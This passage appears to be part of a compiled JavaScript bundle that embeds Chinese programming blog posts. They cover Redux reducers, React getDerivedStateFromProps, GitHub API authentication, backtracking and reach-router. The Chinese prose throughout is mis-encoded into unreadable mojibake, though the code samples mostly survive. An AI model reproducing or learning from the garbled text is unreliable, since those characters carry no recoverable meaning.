 <span class=\\"hljs-keyword\\">const</span> initialState={}\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">state=initialState,action</span>)</span>{\\n    <span class=\\"hljs-comment\\">// æ­¤å¤„å¤„ç†é¢å¤–çš„action</span>\\n    <span class=\\"hljs-keyword\\">switch</span>(action.type){\\n      <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'additionalType\'</span>:\\n        <span class=\\"hljs-comment\\">/*do something*/</span>\\n        <span class=\\"hljs-keyword\\">return</span>  <span class=\\"hljs-comment\\">/*{...}*/</span>;\\n      <span class=\\"hljs-keyword\\">default</span>:\\n        <span class=\\"hljs-comment\\">// é‡åˆ°æ— åŒ¹é…çš„actionï¼Œè¿”å›ç»™åŸå§‹reducerå¤„ç†</span>\\n        <span class=\\"hljs-keyword\\">const</span> newState=reducer(initialState,action)\\n        <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-comment\\">/*{...}*/</span>\\n    }\\n  }\\n}</code></pre></code></pre>\\n<p>è°ƒç”¨ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> {createStroe} <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'redux\'</span>;\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state={},action</span>)</span>{\\n  <span class=\\"hljs-keyword\\">switch</span>(action.type){\\n    <span class=\\"hljs-comment\\">/* åˆå§‹çš„reducer*/</span>\\n  }\\n}\\n<span class=\\"hljs-keyword\\">const</span> hocReducer=HOCReducer(reducer);\\n<span class=\\"hljs-keyword\\">const</span> store=createStroe(hocReducer);\\n\\n<span class=\\"hljs-comment\\">/* dispatchåå°±ä¼šä»hocReducerå¼€å§‹æ‰§è¡Œéå†*/</span></code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-25","timeArr":[2018,5,25,0,0,0,0],"title":"é«˜é˜¶reduxçš„ä½¿ç”¨","uuid":"0c096d72d4add9e9c5b5fcc24624e4c8d6669aec","summary":"<p>###3 Reduxçš„å¤ç”¨</p>\\n<p>å› ä¸ºæ¯ä¸€æ¬¡dispatchéƒ½æ˜¯éå†æ‰€æœ‰reducerå¯»æ‰¾typeï¼Œå› æ­¤æ¯ä¸€ä¸ªactionçš„typeä¸èƒ½ä¸€è‡´ï¼Œ\\nå½“éœ€è¦å¤ç”¨reduceræ—¶ï¼Œå¯ä»¥ä½¿ç”¨prefix</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">generateReducer</span>(<span class=\\"hljs-params\\">prefix,state</span>)</span>{\\n  <span class=\\"hljs-keyword\\">const</span> SOMETYPE=pr...</code></pre>","slug":"gao-jie-redux-de-shi-yong","sha":"1a051b70892a766030ca8e55ac15f3c3fbb2d887"}')},593:function(n){n.exports=JSON.parse('{"content":"<p>reactçš„<code>getDerivedStateFromProps</code>å†…éƒ¨ä¸å¯ä»¥æœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºç°åœ¨æ˜¯æ— è®ºæ˜¯stateæ”¹å˜è¿˜æ˜¯propsæ”¹å˜ï¼Œ\\néƒ½ä¼šæ‰§è¡Œå®ƒã€‚</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>è¿™ç§å†™æ³•ä¼šå¯¼è‡´å¤šæ¬¡å¾ªç¯æ¸²æŸ“ç›´åˆ°æŠ¥é”™</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props){\\n    <span class=\\"hljs-keyword\\">super</span>(props)\\n    <span class=\\"hljs-keyword\\">this</span>.myFetch=<span class=\\"hljs-keyword\\">this</span>.myFetch.bind(<span class=\\"hljs-keyword\\">this</span>)\\n    <span class=\\"hljs-keyword\\">this</span>.state = {\\n      <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"\\"</span>,\\n      <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-literal\\">null</span>,\\n      <span class=\\"hljs-attr\\">myFetch</span>:<span class=\\"hljs-keyword\\">this</span>.myFetch\\n    };\\n  }\\n\\n\\n  <span class=\\"hljs-keyword\\">static</span> getDerivedStateFromProps(props, state) {\\n    <span class=\\"hljs-keyword\\">if</span> ( props.name !== state.name ) {\\n      <span class=\\"hljs-comment\\">// è¿™ä¸€å¥æ˜¯æœ‰å‰¯ä½œç”¨çš„ï¼Œå®ƒä¼šæ”¹å˜stateçŠ¶æ€ï¼Œ</span>\\n      <span class=\\"hljs-comment\\">// ç„¶åå†æ¬¡è°ƒç”¨getDerivedStateFromPropsï¼Œå†æ¬¡æ”¹å˜stateçŠ¶æ€...</span>\\n      state.myFetch(props.name)\\n      <span class=\\"hljs-keyword\\">return</span> {\\n        <span class=\\"hljs-attr\\">name</span>: props.name\\n      };\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">null</span>;\\n  }\\n  myFetch(){\\n      <span class=\\"hljs-keyword\\">this</span>.setState({\\n        <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-string\\">\\"newList\\"</span>\\n      })\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;{this.state.list}&lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p>ä»¥ä¸Šæ­£ç¡®å†™æ³•åº”ä¸ºï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props){\\n    <span class=\\"hljs-keyword\\">super</span>(props)\\n    <span class=\\"hljs-keyword\\">this</span>.myFetch=<span class=\\"hljs-keyword\\">this</span>.myFetch.bind(<span class=\\"hljs-keyword\\">this</span>)\\n    <span class=\\"hljs-keyword\\">this</span>.state = {\\n      <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"\\"</span>,\\n      <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-literal\\">null</span>,\\n      <span class=\\"hljs-comment\\">//myFetch:this.myFetch</span>\\n    };\\n  }\\n\\n  <span class=\\"hljs-comment\\">// çº¯å‡½æ•°ï¼Œæ— å‰¯ä½œç”¨</span>\\n  <span class=\\"hljs-keyword\\">static</span> getDerivedStateFromProps(props, state) {\\n    <span class=\\"hljs-keyword\\">if</span> ( props.name !== state.name ) {\\n      <span class=\\"hljs-keyword\\">return</span> {\\n        <span class=\\"hljs-attr\\">name</span>: props.name,\\n        <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-literal\\">null</span>\\n      };\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">null</span>;\\n  }\\n  componentDidUpdate(){\\n    <span class=\\"hljs-keyword\\">if</span>(!<span class=\\"hljs-keyword\\">this</span>.state.list){\\n      <span class=\\"hljs-keyword\\">this</span>.myFetch(<span class=\\"hljs-keyword\\">this</span>.props.name)\\n    }\\n  }\\n\\n  <span class=\\"hljs-comment\\">// çœ‹æ˜¯å¦éœ€è¦åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨</span>\\n  componentDidMount(){\\n    <span class=\\"hljs-keyword\\">this</span>.myFetch(<span class=\\"hljs-keyword\\">this</span>.props.name)\\n  }\\n\\n  myFetch(){\\n    <span class=\\"hljs-keyword\\">this</span>.setState({\\n      <span class=\\"hljs-attr\\">list</span>: <span class=\\"hljs-string\\">\\"newList\\"</span>\\n    })\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;{this.state.list}&lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-06-07","timeArr":[2018,5,7,0,0,0,0],"title":"getDerivedStateFromProps","uuid":"5a309baed59601de7885e379ac2562b045fb413d","summary":"<p>reactçš„<code>getDerivedStateFromProps</code>å†…éƒ¨ä¸å¯ä»¥æœ‰å‰¯ä½œç”¨ï¼Œå› ä¸ºç°åœ¨æ˜¯æ— è®ºæ˜¯stateæ”¹å˜è¿˜æ˜¯propsæ”¹å˜ï¼Œ\\néƒ½ä¼šæ‰§è¡Œå®ƒã€‚</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>è¿™ç§å†™æ³•ä¼šå¯¼è‡´å¤šæ¬¡å¾ªç¯æ¸²æŸ“ç›´åˆ°æŠ¥é”™</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props){\\n  ...</code></pre>","slug":"getDerivedStateFromProps","sha":"b0683499799fb64f81d0d942134c7304c29cc5f0"}')},594:function(n){n.exports=JSON.parse('{"content":"<p>æœ€è¿‘åœ¨åˆå¹¶ä¸€äº›é¡¹ç›®ï¼Œæœ‰äº›ç”¨<code>Vue</code>ï¼Œæœ‰çš„ç”¨<code>React</code>ï¼Œéœ€è¦å°†å®ƒä»¬æ•´åˆæˆä¸€ä¸ªé¡¹ç›®ï¼Œå°±ç”¨äº†è‡ªå·±çš„å¤šé¡µé¢é¡¹ç›®æ¡†æ¶ï¼Œå‡ ç‚¹æ„Ÿå—å’Œéœ€è¦æ”¹è¿›çš„æƒ³æ³•è®°å½•ä¸‹ã€‚</p>\\n<p>ä¸€äº›æ„Ÿå—ï¼š</p>\\n<ul>\\n<li>æ€»çš„æ¥è¯´åˆå¹¶è¿˜æ˜¯æ¯”è¾ƒé¡ºåˆ©çš„ï¼Œä¸€äº›ä¾èµ–ç»„ä»¶æ¯”è¾ƒæ—§ï¼Œå› æ­¤å¦å¤–ä¸€äº›ä¾èµ–ç»„ä»¶å¿…é¡»é™çº§æ‰èƒ½å…¼å®¹ä½¿ç”¨ï¼›</li>\\n<li>ç”±äºç›®å‰ä¸åŒçš„æ¡†æ¶è¿˜æ˜¯å ç”¨ä¸åŒé¡µé¢ï¼Œéœ€è¦å¦å¤–ä¸€ä¸ªç‹¬ç«‹çš„å¯¼èˆªæ ï¼›</li>\\n<li>å¦å¤–ï¼Œå¦‚æœé¡µé¢åç§°å’Œè·¯ç”±åç§°ä¹Ÿæ˜¯ä¸èƒ½é‡å¤ï¼Œå¦åˆ™ä¼šé€ æˆå†²çª</li>\\n</ul>\\n<p>éœ€è¦æ”¹è¿›ï¼š</p>\\n<ul>\\n<li>é¡µé¢åç§°å’Œè·¯ç”±åç§°å†²çªé—®é¢˜ï¼Œè€ƒè™‘ï¼š(æ£€æµ‹æœºåˆ¶ï¼Ÿæ–°çš„è§„åˆ™(<code>spa</code>ç›®å½•ä¸‹ä¸ç¼–è¯‘å…¶ä»–é¡µé¢)ï¼Ÿ)</li>\\n<li>æ¡†æ¶åˆå¹¶ä¸èƒ½åšåˆ°åŒé¡µé¢çš„åˆå¹¶ï¼Œå°è¯•ï¼š(å¤šä¸ªå‰ç«¯æ¡†æ¶)ï¼Œè€ƒè™‘ï¼šï¼ˆæ¡†æ¶ä¹‹å‰é€šä¿¡é—®é¢˜ï¼‰ï¼Œå‚è€ƒï¼šï¼ˆå¾®å‰ç«¯ï¼‰</li>\\n<li>é¡µé¢å›ºå®šé€»è¾‘æ–‡ä»¶å¤ªå¤šï¼Œè€ƒè™‘å¤ç”¨</li>\\n</ul>\\n<p>æ€»çš„æ¥è¯´ï¼Œå°é—®é¢˜é‡åˆ°å¾ˆå¤šï¼Œä½†ä¹Ÿå®¹æ˜“è§£å†³ï¼Œå¤§é—®é¢˜å¾€å¾€éƒ½æ˜¯ç»“æ„æ€§çš„é—®é¢˜ï¼Œå¿…é¡»ä¸»åŠ¨å»å‘ç°ï¼Œå¤šæ–¹é¢è€ƒè™‘ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2021-06-06","timeArr":[2021,5,6,0,0,0,0],"title":"å…³äºå¤šé¡µé¢æ¶æ„çš„ä¸€äº›æ”¹è¿›è®°å½•","uuid":"eb0d4100c186d638be56c73f46e9a3c7b79ef557","summary":"<p>æœ€è¿‘åœ¨åˆå¹¶ä¸€äº›é¡¹ç›®ï¼Œæœ‰äº›ç”¨<code>Vue</code>ï¼Œæœ‰çš„ç”¨<code>React</code>ï¼Œéœ€è¦å°†å®ƒä»¬æ•´åˆæˆä¸€ä¸ªé¡¹ç›®ï¼Œå°±ç”¨äº†è‡ªå·±çš„å¤šé¡µé¢é¡¹ç›®æ¡†æ¶ï¼Œå‡ ç‚¹æ„Ÿå—å’Œéœ€è¦æ”¹è¿›çš„æƒ³æ³•è®°å½•ä¸‹ã€‚</p>\\n<p>ä¸€äº›æ„Ÿå—ï¼š</p>\\n<ul>\\n<li>æ€»çš„æ¥è¯´åˆå¹¶è¿˜æ˜¯æ¯”è¾ƒé¡ºåˆ©çš„ï¼Œä¸€äº›ä¾èµ–ç»„ä»¶æ¯”è¾ƒæ—§ï¼Œå› æ­¤å¦å¤–ä¸€äº›ä¾èµ–ç»„ä»¶å¿…é¡»é™çº§æ‰èƒ½å…¼å®¹ä½¿ç”¨ï¼›</li>\\n<li>ç”±äºç›®å‰ä¸åŒçš„æ¡†æ¶è¿˜æ˜¯å ç”¨ä¸åŒé¡µé¢ï¼Œéœ€è¦å¦å¤–ä¸€ä¸ªç‹¬ç«‹çš„å¯¼...</li>\\n</ul>","slug":"guan-yu-duo-ye-mian-jia-gou-de-yi-xie-gai-jin-ji-lu","sha":"ab7b2795a1c62781543e7cd495aa91abce71e480"}')},595:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"githubapi-authorization\\">GithubAPI-Authorization</h2>\\n<p>ä¸€äº›ç‰¹å®šçš„APIï¼Œä¾‹å¦‚è·å–<code>user</code>çš„publicèµ„æ–™ï¼Œ<code>repo</code>çš„å†…å®¹ç­‰ï¼Œä¸è®¤è¯ä¹Ÿå¯ä»¥è·å–ï¼Œ\\nåŒºåˆ«æ˜¯ï¼Œä¸è®¤è¯ï¼Œå¤§çº¦æ¯ä¸ªå°æ—¶åªæœ‰60æ¬¡è°ƒç”¨çš„æ¬¡æ•°é™åˆ¶ï¼Œè€Œä½¿ç”¨è®¤è¯åï¼Œåˆ™å¤§çº¦æœ‰5000æ¬¡çš„è°ƒç”¨æ¬¡æ•°ã€‚</p>\\n<p>è®¤è¯æœ‰2æ–¹é¢ï¼Œ</p>\\n<ol>\\n<li><p>ä½¿ç”¨ä½ è‡ªå·±çš„åä¹‰å»åšä¸€äº›äº‹æƒ…</p>\\n</li>\\n<li><p>ä½¿ç”¨ä»–äººçš„åä¹‰å»åšä¸€äº›äº‹æƒ…</p>\\n</li>\\n</ol>\\n<h3 id=\\"yi-zi-ji-ming-yi\\">ä»¥è‡ªå·±åä¹‰</h3>\\n<p>å…ˆè¯´ç¬¬ä¸€ç§ï¼Œç¬¬ä¸€ç§ï¼Œå½“ç„¶å¯ä»¥åœ¨ç½‘é¡µä¸Šæ“ä½œï¼Œè¿™æ˜¯æœ€ç›´æ¥çš„ï¼Œå¦‚æœä½ éœ€è¦ç”¨æ§åˆ¶å°è°ƒç”¨apiï¼Œ\\né‚£ä¹ˆä½ éœ€è¦å»ºç«‹ä¸€ä¸ª<code>personal token</code>ï¼Œåœ¨githubçš„settingé‡Œé¢ï¼Œé‡Œé¢å¯ä»¥å‹¾é€‰å¯¹åº”çš„<code>scope</code>ä¹Ÿå°±æ˜¯å…è®¸çš„èŒƒå›´ã€‚</p>\\n<p>ä¾‹å¦‚ï¼Œå‹¾é€‰<code>public_repo</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨apiå»<code>create issue</code>ï¼Œ<code>create comment</code>ç­‰ç­‰</p>\\n<p>å…·ä½“çš„è°ƒç”¨æ–¹å¼å¯ä»¥æ”¾åœ¨headeræˆ–è€…parameter</p>\\n<ul>\\n<li>header</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> request = <span class=\\"hljs-keyword\\">new</span> Request(<span class=\\"hljs-string\\">\'https://api.github.com/user/{username}\'</span>,{\\n    <span class=\\"hljs-attr\\">headers</span>: <span class=\\"hljs-keyword\\">new</span> Headers({\\n      <span class=\\"hljs-string\\">\'Authorization\'</span>: <span class=\\"hljs-string\\">\'token xxxxxxxxxxxxxxxx\'</span>\\n    })\\n});\\nfetch(request)\\n.then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">data</span>=&gt;</span>data.json()).then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">obj</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(obj)\\n})</code></pre></code></pre>\\n<ul>\\n<li>parameter</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>fetch(<span class=\\"hljs-string\\">\\"https://api.github.com/user/{username}/?access_token=token xxxxxxxxxxxxxx\\"</span>)\\n.then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">data</span>=&gt;</span>data.json()).then(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">obj</span>=&gt;</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(obj)\\n})</code></pre></code></pre>\\n<h3 id=\\"yi-ta-ren-ming-yi\\">ä»¥ä»–äººåä¹‰</h3>\\n<p>å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹è®¤è¯ï¼Œä¹Ÿå°±æ˜¯settingé‡Œé¢çš„<code>oAuth token</code>ï¼Œå¡«å†™ä½ çš„åº”ç”¨æˆ–ç½‘ç«™çš„urlï¼Œ\\n<code>callback</code>çš„æ„æ€æ˜¯ï¼Œå½“å®¢æˆ·è®¤è¯å®Œæ¯•ä¼šé‡å®šå‘åˆ°å“ªé‡Œã€‚</p>\\n<p><code>callback</code>ä¸€èˆ¬æŒ‡å‘çš„æ˜¯ä½ è‡ªå·±çš„æœåŠ¡å™¨ï¼Œåœ¨é‚£é‡Œä½ éœ€è¦å°†é‡å®šå‘çš„urlä¸­çš„å‚æ•°<code>code</code>ï¼Œä½ çš„<code>client_id</code>ï¼Œ<code>client_secret</code>åˆå¹¶å»è·å–ç”¨æˆ·çš„<code>token</code>ã€‚</p>\\n<p>ç„¶åå°±å¯ä»¥åƒä½¿ç”¨è¿™ä¸ªtoken(ä½¿ç”¨æ–¹æ³•è§ä¸Šé¢)å»åšä¸€äº›äº‹æƒ…äº†ã€‚</p>\\n<p>æ³¨æ„ï¼š</p>\\n<ol>\\n<li><code>client_secret</code>ä¸å¯ä»¥é€æ¼ç»™å…¶ä»–äººï¼Œå¦åˆ™åˆ«äººå¯ä»¥å€Ÿä½ çš„åä¹‰å»è·å–å…¶ä»–äººçš„æˆæƒã€‚</li>\\n<li>å…³äºåˆå¹¶æ•°æ®è·å–tokençš„è¿‡ç¨‹ï¼Œè¦åœ¨åç«¯è¿›è¡Œï¼Œå‰ç«¯ä¹Ÿå¯ä»¥è¿›è¡Œï¼Œä½†æ²¡æœ‰å®‰å…¨æ€§å¯è¨€ã€‚</li>\\n</ol>\\n","toc":[{"anchor":"githubapi-authorization","level":2,"text":"GithubAPI-Authorization"},{"anchor":"yi-zi-ji-ming-yi","level":3,"text":"ä»¥è‡ªå·±åä¹‰"},{"anchor":"yi-ta-ren-ming-yi","level":3,"text":"ä»¥ä»–äººåä¹‰"}],"relatedTags":null,"created_at":"2018-09-28","timeArr":[2018,8,28,0,0,0,0],"title":"å…³äºgithub-api.v3è®¤è¯æ–¹é¢çš„æ€»ç»“","uuid":"734ec46092d55f646e70dce2766a3c42e017cad4","summary":"<h4>GithubAPI-Authorization</h4>\\n<p>ä¸€äº›ç‰¹å®šçš„APIï¼Œä¾‹å¦‚è·å–<code>user</code>çš„publicèµ„æ–™ï¼Œ<code>repo</code>çš„å†…å®¹ç­‰ï¼Œä¸è®¤è¯ä¹Ÿå¯ä»¥è·å–ï¼Œ\\nåŒºåˆ«æ˜¯ï¼Œä¸è®¤è¯ï¼Œå¤§çº¦æ¯ä¸ªå°æ—¶åªæœ‰60æ¬¡è°ƒç”¨çš„æ¬¡æ•°é™åˆ¶ï¼Œè€Œä½¿ç”¨è®¤è¯åï¼Œåˆ™å¤§çº¦æœ‰5000æ¬¡çš„è°ƒç”¨æ¬¡æ•°ã€‚</p>\\n<p>è®¤è¯æœ‰2æ–¹é¢ï¼Œ</p>\\n<ol>\\n<li>\\n<p>ä½¿ç”¨ä½ è‡ªå·±çš„åä¹‰å»åšä¸€äº›äº‹æƒ…</p>\\n</li>\\n<li>\\n<p>...</p>\\n</li>\\n</ol>","slug":"guan-yu-github-api.v3-ren-zheng-fang-mian-de-zong-jie","sha":"6b205fb9eb1995355142e4b491f0e45bac6ca9f9"}')},596:function(n){n.exports=JSON.parse('{"content":"<p>ä»Šå¤©åœ¨LeetCodeçœ‹åˆ°ä¸€ç¯‡éå¸¸æœ‰ä»·å€¼çš„è®¨è®ºï¼Œåˆ—ä¸¾äº†ä¸€ç³»åˆ—åˆ—æ•°ç»„çš„<code>å›æº¯ç®—æ³•</code>ï¼Œè‡ªå·±åŠ¨æ‰‹ä¸€ä¸ªä¸ªå®Œæˆåï¼Œ\\næ„Ÿè§‰å¯¹ç†è§£å›æº¯ç®—æ³•çš„åŸç†æœ‰å¾ˆå¤§å¸®åŠ©ã€‚</p>\\n<p>å°±ç”¨ä¸€ç¯‡æ–‡ç« è®°å½•ä¸‹è§£æè¿‡ç¨‹ã€‚</p>\\n<p><a href=\\"https://leetcode.com/problems/combination-sum/discuss/16502/A-general-approach-to-backtracking-questions-in-Java-(Subsets-Permutations-Combination-Sum-Palindrome-Partitioning)\\">åŸæ–‡åœ°å€</a></p>\\n<p>å…¶å®å›æº¯å°±æ˜¯æŒ‰é¡ºåºçš„ä¸€ç§ç©·ä¸¾ï¼Œä½†æ˜¯å®ƒä¼šè®¾å®š<code>åœæ­¢æ¡ä»¶</code>å’Œ<code>è¾¾æˆæ¡ä»¶</code></p>\\n<p>ä¸€æ—¦ç¬¦åˆ<code>åœæ­¢æ¡ä»¶</code>ï¼Œç›´æ¥æ•´ä½“è·³è¿‡ï¼ŒåŒ…æ‹¬å®ƒåé¢çš„å­é›†å…¨éƒ¨è·³è¿‡</p>\\n<p>ä¸€æ—¦ç¬¦åˆ<code>è¾¾æˆæ¡ä»¶</code>ï¼Œä¾¿æ˜¯æ‰€éœ€è¦çš„æ•°æ®ï¼Œæ·»åŠ åˆ°ç»“æœé›†åˆé‡Œ</p>\\n<p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>åˆ—ä¸¾æ•°ç»„arrçš„æ‰€æœ‰çš„é•¿åº¦ç›¸åŒçš„ç»„åˆï¼Œå­—ç¬¦ä¸é‡å¤\\nä¾‹å¦‚ï¼š[1,2,3]\\nè¾“å‡ºï¼š\\n[\\n  [1,2,3],\\n  [1,3,2],\\n  [2,1,3],\\n  [2,3,1],\\n  [3,1,2],\\n  [3,2,1]\\n]</code></pre></code></pre><p>ä»£ç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">subSet</span>(<span class=\\"hljs-params\\">nums</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> result=[],temp=[]\\n  backtrack(result,temp,nums)\\n  <span class=\\"hljs-keyword\\">return</span> result\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">backtrack</span>(<span class=\\"hljs-params\\">result,temp,nums</span>)</span>{\\n    <span class=\\"hljs-comment\\">// è¾¾æˆæ¡ä»¶</span>\\n    <span class=\\"hljs-keyword\\">if</span>(temp.length===nums.length)result.push(temp.slice())\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;nums.length;i++){\\n      <span class=\\"hljs-comment\\">// åœæ­¢æ¡ä»¶</span>\\n      <span class=\\"hljs-keyword\\">if</span>(temp.includes(nums[i]))<span class=\\"hljs-keyword\\">continue</span>\\n      temp.push(nums[i])\\n      backtrack(result,temp,nums)\\n      temp.pop()\\n    }\\n  }\\n}</code></pre></code></pre>\\n<p>å®ƒçš„è¿è¡Œè½¨è¿¹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>1\\n1 1   Ã—\\n1 2\\n1 2 1 Ã—\\n1 2 2 Ã—\\n1 2 3 âˆš\\n1 3\\n1 3 1 Ã—\\n1 3 2 âˆš\\n1 3 3 Ã—\\n2\\n2 1\\n2 1 1 Ã—\\n2 1 2 Ã—\\n2 1 3 âˆš\\n2 2   Ã—\\n2 3\\n2 3 1 âˆš\\n2 3 2 Ã—\\n2 3 3 Ã—\\n3\\n3 1\\n3 1 1 Ã—\\n3 1 2 âˆš\\n3 1 3 Ã—\\n3 2\\n3 2 1 âˆš\\n3 2 2 Ã—\\n3 2 3 Ã—\\n3 3   Ã—</code></pre></code></pre><p>ä¸€æ—¦çˆ¶çº§è¾¾åˆ°<code>åœæ­¢æ¡ä»¶</code>ï¼Œä¾‹å¦‚<code>2 2</code>ï¼Œåƒåé¢çš„å­é›†<code>2 2 1</code>ï¼Œ<code>2 2 2</code>éƒ½ä¸ä¼šè¿›è¡Œ</p>\\n<p>å½“é€šè¿‡çš„<code>åœæ­¢æ¡ä»¶</code>å¹¶ä¸”ç¬¦åˆ<code>è¾¾æˆæ¡ä»¶</code>çš„ï¼Œå°±æ˜¯ç»“æœã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-06","timeArr":[2018,9,6,0,0,0,0],"title":"å…³äºå›æº¯ç®—æ³•(backtrack)çš„æ¨¡æ¿è§£æ","uuid":"362c875dc274eb593fe68c8afd58f51afebc57c9","summary":"<p>ä»Šå¤©åœ¨LeetCodeçœ‹åˆ°ä¸€ç¯‡éå¸¸æœ‰ä»·å€¼çš„è®¨è®ºï¼Œåˆ—ä¸¾äº†ä¸€ç³»åˆ—åˆ—æ•°ç»„çš„<code>å›æº¯ç®—æ³•</code>ï¼Œè‡ªå·±åŠ¨æ‰‹ä¸€ä¸ªä¸ªå®Œæˆåï¼Œ\\næ„Ÿè§‰å¯¹ç†è§£å›æº¯ç®—æ³•çš„åŸç†æœ‰å¾ˆå¤§å¸®åŠ©ã€‚</p>\\n<p>å°±ç”¨ä¸€ç¯‡æ–‡ç« è®°å½•ä¸‹è§£æè¿‡ç¨‹ã€‚</p>\\n<p>[åŸæ–‡åœ°å€](https://leetcode.com/problems/combination-sum/discuss/16502/A-ge...</p>","slug":"guan-yu-hui-su-suan-fa-(backtrack)-de-mu-ban-jie-xi","sha":"8392ce085e533c1fff99ad21b3d8583449fec2d3"}')},597:function(n){n.exports=JSON.parse('{"content":"<p>reach-routeræ˜¯ä¸€ä¸ªè½»é‡çº§çš„routerç»„ä»¶ï¼Œå½“ç„¶åŠŸèƒ½ä¹Ÿç›¸å¯¹äºreact-routerå°‘äº†ä¸€äº›ã€‚</p>\\n<p>è¿‘æœŸä½¿ç”¨çš„æ—¶å€™é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼Œåœ¨è¿™é‡Œæ€»ç»“ä¸€æ¬¡</p>\\n<ol>\\n<li><p>routeré‡åˆ°<code>url:parameter</code> ï¼Œå½“æ— æ³•åŒ¹é…çš„æƒ…å†µï¼Œé»˜è®¤ä¼šä¸€ç›´è¯»å–loadingç»„ä»¶ï¼Œå› ä¸ºå®ƒä¸çŸ¥é“è¿™ä¸ªå‚æ•°æ˜¯å¦æœ‰æ•ˆï¼Œ</p>\\n<p> éœ€è¦è‡ªè¡Œåˆ¤æ–­<code>parameter</code>æ˜¯ä¸æ˜¯æœ‰æ•ˆå‚æ•°ï¼Œç„¶åå†å¤„ç†ä¸åŒ¹é…çš„æƒ…å†µ(å¯ä»¥ä½¿ç”¨navigate)</p>\\n</li>\\n<li><p>react-routeræœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œ<code>url:?params</code>æ„æ€æ˜¯å­˜åœ¨æˆ–è€…ä¸å­˜åœ¨paramséƒ½èƒ½åŒ¹é…åˆ°ï¼Œè€Œreach-routerå¹¶æ²¡æœ‰</p>\\n<p> å› æ­¤é‡åˆ°urlå‚æ•°å¯æœ‰å¯æ— çŠ¶å†µå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†™æ³•ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code> &lt;Home path=&quot;/&quot; page={1} /&gt;\\n &lt;Home path=&quot;page/:page&quot; /&gt;</code></pre></code></pre></li>\\n<li><p>å…³äºrouterçš„ç‚¹å‡»åä¼šè‡ªåŠ¨scrollçš„é—®é¢˜</p>\\n<p> è¿™åº”è¯¥æ˜¯ä¸€ä¸ªSPAçš„é€šç—…ï¼Œç‚¹å‡»linkå°±åƒé”šé“¾æ¥ä¸€æ 